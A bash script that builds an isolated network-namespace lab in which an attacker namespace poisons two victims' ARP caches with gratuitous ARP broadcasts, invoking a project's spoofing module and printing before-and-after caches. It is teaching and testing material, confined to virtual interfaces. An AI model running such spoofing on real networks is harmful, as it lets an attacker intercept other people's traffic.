#!/usr/bin/env bash
# Isolated gratuitous ARP spoofing lab (Linux only, needs root).
#
# Topology, all inside network namespaces, one Linux bridge as the switch:
#
#   victim1 --(veth)--+
#   victim2 --(veth)--+-- [switch: br0] --(veth)-- gateway   (10.95.0.1)
#                     |
#                     +--(veth)-- attacker
#
#   Phase 1 (baseline): both victims ping the gateway, so their ARP caches hold
#   the gateway's real MAC.
#   Phase 2 (announcements): the attacker broadcasts gratuitous ARP
#   announcements that bind 10.95.0.1 to its own MAC. One broadcast reaches
#   both victims, and both caches change, without any unicast to a chosen host.
#
# Nothing here touches the host's real network interfaces.
#
# Usage:
#   sudo scripts/lab/gratuitous_arp_lab.sh
#   sudo ANNOUNCEMENTS=5 scripts/lab/gratuitous_arp_lab.sh
#
# Requirements: iproute2 (ip, bridge), ping, and the project virtualenv (.venv).
# Override the interpreter with PYTHON=/path/to/python.

set -euo pipefail

if [[ "$(id -u)" -ne 0 ]]; then
    echo "This lab needs root: run it with sudo." >&2
    exit 1
fi

for tool in ip bridge ping; do
    if ! command -v "$tool" >/dev/null 2>&1; then
        echo "Missing required tool: $tool" >&2
        exit 1
    fi
done

ROOT="$(cd "$(dirname "$0")/../.." && pwd)"
PY="${PYTHON:-$ROOT/.venv/bin/python}"
ANNOUNCEMENTS="${ANNOUNCEMENTS:-3}"
GATEWAY_IP="10.95.0.1"
GATEWAY_MAC="02:00:00:00:00:01"
VICTIM1_IP="10.95.0.10"
VICTIM1_MAC="02:00:00:00:00:10"
VICTIM2_IP="10.95.0.11"
VICTIM2_MAC="02:00:00:00:00:11"
ATTACKER_MAC="02:00:00:00:00:30"

stop_lab() {
    for ns in victim1 victim2 gateway attacker switch; do
        ip netns del "$ns" 2>/dev/null || true
    done
}

trap stop_lab EXIT

# Remove leftovers from a previous interrupted run.
stop_lab

ip netns add switch
for ns in victim1 victim2 gateway attacker; do
    ip netns add "$ns"
done

# Each host gets one veth pair to a switch port named sw-<host>.
ip link add v1-sw type veth peer name sw-v1
ip link set v1-sw netns victim1
ip link set sw-v1 netns switch

ip link add v2-sw type veth peer name sw-v2
ip link set v2-sw netns victim2
ip link set sw-v2 netns switch

ip link add g-sw type veth peer name sw-g
ip link set g-sw netns gateway
ip link set sw-g netns switch

ip link add a-sw type veth peer name sw-a
ip link set a-sw netns attacker
ip link set sw-a netns switch

ip netns exec switch ip link add br0 type bridge
ip netns exec switch ip link set br0 up
for port in sw-v1 sw-v2 sw-g sw-a; do
    ip netns exec switch ip link set "$port" master br0
    ip netns exec switch ip link set "$port" up
done

ip netns exec victim1 ip link set v1-sw address "$VICTIM1_MAC"
ip netns exec victim1 ip addr add "$VICTIM1_IP/24" dev v1-sw
ip netns exec victim1 ip link set v1-sw up
ip netns exec victim2 ip link set v2-sw address "$VICTIM2_MAC"
ip netns exec victim2 ip addr add "$VICTIM2_IP/24" dev v2-sw
ip netns exec victim2 ip link set v2-sw up
ip netns exec gateway ip link set g-sw address "$GATEWAY_MAC"
ip netns exec gateway ip addr add "$GATEWAY_IP/24" dev g-sw
ip netns exec gateway ip link set g-sw up
ip netns exec attacker ip link set a-sw address "$ATTACKER_MAC"
ip netns exec attacker ip link set a-sw up

# MAC cached in namespace $1 for IP $2 on interface $3 ("none" if no entry).
cached_mac() {
    local mac
    mac=$(ip netns exec "$1" ip neigh show "$2" dev "$3" \
        | grep -oE 'lladdr [0-9a-f:]{17}' | cut -d' ' -f2 || true)
    echo "${mac:-none}"
}

show_caches() {
    echo "  victim1's cache for $GATEWAY_IP: $(cached_mac victim1 "$GATEWAY_IP" v1-sw)"
    echo "  victim2's cache for $GATEWAY_IP: $(cached_mac victim2 "$GATEWAY_IP" v2-sw)"
}

# --- Phase 1: baseline -----------------------------------------------------

echo "Phase 1: both victims ping the gateway, so their caches fill"
ip netns exec victim1 ping -c 2 -W 1 "$GATEWAY_IP" >/dev/null
ip netns exec victim2 ping -c 2 -W 1 "$GATEWAY_IP" >/dev/null
show_caches
echo

# --- Phase 2: gratuitous announcements ------------------------------------

GARP_CODE='
import os
from macabre.attacks.gratuitous_arp_spoofing import GratuitousArpConfig, run_gratuitous_arp
import threading
stats = run_gratuitous_arp(
    GratuitousArpConfig(iface="a-sw", spoofed_ip=os.environ["GATEWAY_IP"],
                        count=int(os.environ["ANNOUNCEMENTS"]), interval=0.2),
    threading.Event(),
    lambda _: None,
)
print(f"Attacker: broadcast {stats.frames} gratuitous ARP announcements from {stats.sender_mac}")
'

echo "Phase 2: attacker announces $GATEWAY_IP as its own"
ip netns exec attacker env PYTHONPATH="$ROOT/src" GATEWAY_IP="$GATEWAY_IP" \
    ANNOUNCEMENTS="$ANNOUNCEMENTS" "$PY" -c "$GARP_CODE"
show_caches
echo
echo "Expected: before the announcements both caches hold the gateway's MAC ($GATEWAY_MAC);"
echo "after them, both hold the attacker's MAC ($ATTACKER_MAC), from one broadcast."
